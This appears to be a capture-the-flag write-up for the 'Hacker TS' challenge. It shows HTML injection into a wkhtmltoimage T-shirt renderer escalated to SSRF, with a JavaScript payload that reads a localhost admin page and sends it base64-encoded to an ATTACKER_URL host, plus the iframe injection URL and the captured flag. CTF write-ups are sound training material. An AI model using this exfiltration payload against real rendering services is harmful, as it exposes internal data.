<h1>Hacker TS</h1>

<p>We have some kind of image renderer that places our text onto a T-Shirt image. After some fuzzing, we would find that HTML injection is possible.</p>

<p><img src="../../.gitbook/assets/image (86).png" alt="" /></p>

<p>If we try to load an external resource (e.g. JavaScript or stylesheet), we can capture the request made by the server, and see that the user agent is <code>wkhtmltoimage</code>.</p>

<p>It seems that SSRF vulnerabilities through <code>wkhtmltoimage</code> and <code>wkhtmltopdf</code> are pretty <a href="http://hassankhanyusufzai.com/SSRF-to-LFI/">well known</a>, so we could craft the following payload to exfiltrate the contents of <code>http://localhost:5000/admin</code>.</p>

<p>```markup
<html>
    <body>
        <script>
            function reqListener () {
                var exfil = new XMLHttpRequest();
                exfil.open("GET", "http://ATTACKER_URL/" + btoa(this.responseText), false);
                exfil.send();
            }</p>

<pre><code>        var oReq = new XMLHttpRequest();
        oReq.addEventListener("load", reqListener);
        oReq.open("GET", "http://localhost:5000/admin");
        oReq.send();
    &lt;/script&gt;
&lt;/body&gt;
</code></pre>

<p></html>
```</p>

<p>We can then host the above and load it through an iframe:</p>

<p><code>http://challenge.nahamcon.com:32132/exploit?text=%3Ciframe%20src=%22https://ATTACKER_URL/exploit.html%22%3E&amp;color=%2324d600</code></p>

<p>The contents of the admin page contains the flag:</p>

<p>```markup
<!-- Page Content --></p>

<div class="container">
  <div class="alert alert-success mt-5">
    Hi admin! here is your flag:
    <strong>flag{461e2452088eb397b6138a5934af6231}</strong>
  </div>
</div>

<p><!-- /.container -->
```</p>
